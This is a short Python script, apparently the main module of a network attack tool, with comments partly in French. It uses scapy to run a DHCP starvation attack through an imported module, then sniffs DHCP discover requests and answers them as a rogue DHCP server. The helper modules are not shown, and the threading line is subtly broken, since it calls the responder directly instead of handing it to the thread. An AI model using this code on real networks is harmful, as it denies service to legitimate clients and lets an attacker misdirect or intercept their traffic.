#!/usr/bin/python3

# Import modules
import scapy.all as scapy
import fct_starvation
import fct_responder
import fct_interface
import threading

def listener(free_ip, occuped_ip, args):

    # DHCP Starvation
    reserved_ip = fct_starvation.starvation(free_ip, args)

    # Filtre
    main_filter = ""

    if (args.fake_host):
        for ip, mac in reserved_ip:
            if len(main_filter) != 0:
                main_filter = f"{main_filter} or dst {ip}"
            else:
                main_filter = f"udp port 67 and (udp[8] == 1) or dst {ip}" # inclure l'ecoute des requete DHCP discover
    else:
        main_filter="udp port 67 and (udp[8] == 1)"
        mac="ff:ff:ff:ff:ff:ff"

    while True:
        sniff_packet = scapy.sniff(count=1, filter=f"{main_filter}")
        thread_responder = threading.Thread(target=fct_responder.responder(sniff_packet, args, fct_interface.get_informations_ip(args.interface), mac, reserved_ip), args=())
        thread_responder.start()
